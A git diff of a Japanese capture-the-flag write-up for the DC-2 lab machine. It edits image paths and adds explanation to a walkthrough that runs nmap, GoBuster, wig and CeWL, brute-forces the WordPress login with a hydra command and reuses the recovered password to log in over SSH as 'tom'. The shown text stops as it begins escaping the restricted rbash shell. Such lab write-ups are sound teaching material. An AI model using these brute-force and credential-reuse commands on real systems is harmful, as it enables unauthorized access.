@@ -97,7 +97,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds
 次に、DC-2のWebサイトに直接アクセスし、攻撃を試みます。
 しかし、hXXp://192.168.56.110にアクセスしても次のような画面が表示され、エラーが出てしまいます。
 
-![alt text](../images/nmap/fail_to_show_toppage.png)
+![alt text](/images/nmap/fail_to_show_toppage.png)
 
 この原因は、
 
@@ -118,11 +118,11 @@ sudo vi /etc/hosts
 とターゲットのIPアドレスとドメイン名の紐付けを直接追記します。
 
 設定完了後、ブラウザのアドレスバーに改めて`hXXp://192.168.56.110/`と入力してアクセスすると、無事にリダイレクトが行われ、ターゲットマシンのWordPressのトップページが表示されるようになります。
-![alt text](../images/DC2_Toppage.png)
+![alt text](/images/DC2_Toppage.png)
 
 Webサイトを探索すると、"Flag 1"というページがあり、ヒントとして`CeWL`というツールを用いることが示唆されていました。
 
-![alt text](../images/flag1.png)
+![alt text](/images/flag1.png)
 
 Webサイトに入力欄が無かったので、`GoBuster`ツールを用いて隠されたディレクトリを探索します。
 
@@ -162,7 +162,7 @@ Finished
 
 ブラウザで`hXXp://192.168.56.110/wp-admin/`にアクセスすると、ログイン画面が表示されました。
 
-![alt text](../images/login.png)
+![alt text](/images/login.png)
 
 ユーザーネームやパスワードが分からないので、`wig`というWordPressに対する解析ツールを用います。`wig`を用いることでバージョンを絞り込めます。
 
@@ -251,9 +251,8 @@ Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
 ┌─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $cewl -m 5 -w dict.txt http://dc-2
 CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
-```
 
-```bash
+
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -267,6 +266,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
 ```
+
+`jerry`ユーザーと`tom`ユーザーのパスワードが判明しました。
+実際にログインしてみると、以下のようなダッシュボードが表示されました。
+
+![alt text](/images/tom.png)
+
+しかし、ダッシュボードを確認するとメールアドレスなどの情報は入手できたものの、直接次の攻撃のステップにつながりそうな手掛かりは見つかりませんでした。
+そこで、序盤の`nmap`で得たSSHポートが開いていたという情報を思い出し、ダッシュボードと同じパスワードが使い回されている可能性が高いと考え、侵入を試みました。
 
 ```bash
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
@@ -287,6 +294,11 @@ permitted by applicable law.
 tom@DC-2:~$ 
 ```
 
+`jerry`ユーザーはパスワードが異なり侵入はできませんでしたが、`tom`ユーザーで無事侵入ができました。
+
+現在の自身の状況を確認します。
+
+```bash
 tom@DC-2:~$ whoami
 -rbash: whoami: command not found
 tom@DC-2:~$ id
@@ -309,11 +321,24 @@ drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr
 
 tom@DC-2:~$ cat flag3.txt
 -rbash: cat: command not found
+```
+`flag3.txt`の存在は確認できましたが、`whoami`や`id`、`cat`といった基本的なコマンドを使うことに制限がかかっている状況です。
 
+現在何のコマンドが使えるのか確認します。
+```bash
 tom@DC-2:~$ ls /home/tom/usr/bin
 less  ls  scp  vi
+```
+`vi`コマンドが使えることが分かったので、これで`flag3.txt`の中身を覗きました。
+```bash
+Poor old Tom is always running after Jerry. 
+Perhaps he should su for all the stress he causes.
+```
 
-Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+言葉遊びで`su`コマンドを用いることが示唆されていました。
+`su`を用いることで`tom`から`jerry`へとユーザーを切り替えることが可能ですが、先ほど判明した現在用いることができるコマンドには`su`が含まれていません。
+
+そこで、`vi`を用いて制限を緩和することを試みます。現在のコマンドの制限は自身が`rbash`というシェルにいるとのに起因しており、
 
 tom@DC-2:~$ echo $SHELL
 /bin/rbash
